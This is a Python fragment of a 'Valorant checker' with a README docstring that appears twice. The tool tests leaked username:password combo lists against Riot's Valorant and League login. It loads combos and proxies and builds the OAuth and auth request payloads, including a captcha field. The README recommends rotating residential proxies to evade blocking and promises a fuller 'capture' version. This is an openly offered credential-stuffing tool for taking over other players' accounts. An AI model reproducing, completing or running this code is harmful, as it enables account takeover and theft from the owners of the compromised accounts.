"""
## I've another version with full capture and optimized+functions

## which will be posted as soon as this post reaches 20 stars.
___
# VALORANT CHECKER WORKING CAPTCHALESS
___
This checker is a **free version** that only performs combo authentication on Riot (Valorant/League).

**This free version will not receive upgrades**.

**I will not provide support**.
___
## Important Notes:
**Do not ask dumb questions, just read below:**
- In `combo.txt` use the format:
  `user:pass`

- Proxy format:
  `user:pass@host:port` or `host:port`

- If you need to change the delays, do so wisely.
___
## Recommendation:
Use **high-quality rotating residential proxies**.
If you're getting too many errors, your proxy is probably bad.
___
"""

def lc():
    with open("combo.txt", "r") as file:
        combos = file.readlines()
        list_combo = [combo.strip() for combo in combos]
        return list_combo

def lp():
    with open("proxies.txt", "r") as file:
        proxies = file.readlines()
    return [proxy.strip() for proxy in proxies]

def b():
    bd = {
        "client_id": "play-valorant-web-prod",
        "nonce": "1",
        "redirect_uri": "https://playvalorant.com/opt_in",
        "response_type": "token id_token",
        "scope": "openid link ban lol_region locale region",
    }
    return bd


def bb(username, password):
    bbd = {
        "type": "auth",
        "username": username,
        "password": password,
        "remember": False,
        "language": "en_US",
        "captcha": "hcaptcha ",
    }
    return bbd
"""
## I've another version with full capture and optimized+functions

## which will be posted as soon as this post reaches 20 stars. 
___
# VALORANT CHECKER WORKING CAPTCHALESS
___
This checker is a **free version** that only performs combo authentication on Riot (Valorant/League).

**This free version will not receive upgrades**.

**I will not provide support**.
___
## Important Notes:
**Do not ask dumb questions, just read below:**
- In `combo.txt` use the format:
  `user:pass`

- Proxy format:
  `user:pass@host:port` or `host:port`

- If you need to change the delays, do so wisely.
___
## Recommendation:
Use **high-quality rotating residential proxies**.  
If you're getting too many errors, your proxy is probably bad.
___
"""